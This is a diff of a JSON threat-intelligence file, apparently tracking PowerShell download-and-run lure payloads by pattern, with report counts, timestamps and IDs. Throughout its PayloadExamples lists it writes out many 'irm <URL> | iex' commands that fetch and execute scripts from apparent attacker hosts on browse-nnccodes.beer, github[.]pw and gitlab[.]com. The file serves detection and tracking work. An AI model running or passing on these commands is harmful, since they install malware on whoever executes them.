@@ -1,13 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 149,
-    "ReportCount": 149,
-    "FirstSeen": "2026-11-10T15:48:45.628000+00:00",
+    "DistinctPayloadCount": 147,
+    "ReportCount": 147,
+    "FirstSeen": "2026-11-10T16:02:40.674000+00:00",
     "LastSeen": "2026-11-17T14:55:43.108000+00:00",
     "ReportIds": [
-      "cmwav7iz204ri0omlzmu2pekx",
-      "cmwav9g8a04tj0omlpwfgxcpv",
       "cmwavpfda058j0omlaap4heeo",
       "cmwavxxeu05bp0omlgbq1bj3q",
       "cmwaw0ua500140oml8e35yh3p",
@@ -259,7 +257,6 @@
       "irm 'browse-nnccodes.beer/258af50be7f8070a'|iex;",
       "irm 'browse-nnccodes.beer/28b87eaada92b942'|iex;",
       "irm 'browse-nnccodes.beer/2b7be24f0fb055c2'|iex;",
-      "irm 'browse-nnccodes.beer/2bfe3608c82ab444'|iex;",
       "irm 'browse-nnccodes.beer/2caa31d3ba1b8b12'|iex;",
       "irm 'browse-nnccodes.beer/2dccc5387a5d5584'|iex;",
       "irm 'browse-nnccodes.beer/2efb6f6a92b0c99d'|iex;",
@@ -269,7 +266,6 @@
       "irm 'browse-nnccodes.beer/3f8a349007b400af'|iex;",
       "irm 'browse-nnccodes.beer/44735eefdb1d4abd'|iex;",
       "irm 'browse-nnccodes.beer/44f5c1c159276caa'|iex;",
-      "irm 'browse-nnccodes.beer/47b7c81b0049a5bb'|iex;",
       "irm 'browse-nnccodes.beer/4ebcfb3eddea4f02'|iex;",
       "irm 'browse-nnccodes.beer/5955e0d1f05713da'|iex;",
       "irm 'browse-nnccodes.beer/69845b449b7231eb'|iex;",
@@ -431,10 +427,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 39,
-    "ReportCount": 39,
+    "DistinctPayloadCount": 40,
+    "ReportCount": 40,
     "FirstSeen": "2026-11-10T21:20:06.377000+00:00",
-    "LastSeen": "2026-11-17T12:59:32.580000+00:00",
+    "LastSeen": "2026-11-17T15:48:38.351000+00:00",
     "ReportIds": [
       "cmwb71nav01nq0nmlm04mhxot",
       "cmwb7gg5t01t90nmlz5690sam",
@@ -474,7 +470,8 @@
       "cmwjyukd3198l0omlbovyvnwg",
       "cmwkmw17h1f990oml8ubw5izj",
       "cmwkmw4kx1f9x0omlu6etnpyg",
-      "cmwkp8vhm1fhu0omljubkjak1"
+      "cmwkp8vhm1fhu0omljubkjak1",
+      "cmwkvabz41g3d0omlam9kifpb"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -503,6 +500,7 @@
       "(irm 'https://github[.]pw/off1/139e9a80d631579e')|iex",
       "(irm 'https://github[.]pw/webopc22/7534a6f5a9850f76')|iex",
       "(irm 'https://github[.]pw/wp/05f60a2f5e22b527')|iex",
+      "(irm 'https://github[.]pw/wp/0eadba8e6c7373ad')|iex",
       "(irm 'https://github[.]pw/wp/4ff6ecee35528485')|iex",
       "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
       "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
@@ -520,15 +518,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 14,
-    "ReportCount": 136,
-    "FirstSeen": "2026-11-10T15:49:40.482000+00:00",
-    "LastSeen": "2026-11-17T15:09:07.568000+00:00",
+    "DistinctPayloadCount": 13,
+    "ReportCount": 134,
+    "FirstSeen": "2026-11-10T16:11:23.111000+00:00",
+    "LastSeen": "2026-11-17T15:49:43.918000+00:00",
     "ReportIds": [
-      "cmwav8p9904sb0omlyw3umbet",
-      "cmwavbk7z04ys0omlu2b5g7y5",
-      "cmwavdwqc04zq0oml90kk0ugf",
-      "cmwavodzt057k0omlbee77awg",
       "cmwaw0me9000g0omlvok9weut",
       "cmwawij39007h0omls43cjle7",
       "cmwawqbdd00aw0oml6ie6cyr9",
@@ -660,7 +654,9 @@
       "cmwk6hw231aqb0omlyr9ew0ye",
       "cmwk6js0k1at90omloc5rplsj",
       "cmwks1j5h1fne0omlmmivmcx4",
-      "cmwktvio01fxo0omlc5hd3w8p"
+      "cmwktvio01fxo0omlc5hd3w8p",
+      "cmwkv9kms1g1g0omljms1lzaw",
+      "cmwkvbqmg1g470omltoxx8l7x"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -675,7 +671,6 @@
       "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
-      "IRM gitlab[.]com/rytu08-74/b61dad-f0cc-45b4-affa-f15a6b6fb779/-/raw/main/611c2C8-1e4B-4d28-AdF2-000Bb7f52B94 | IEX",
       "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX"
     ]
   },
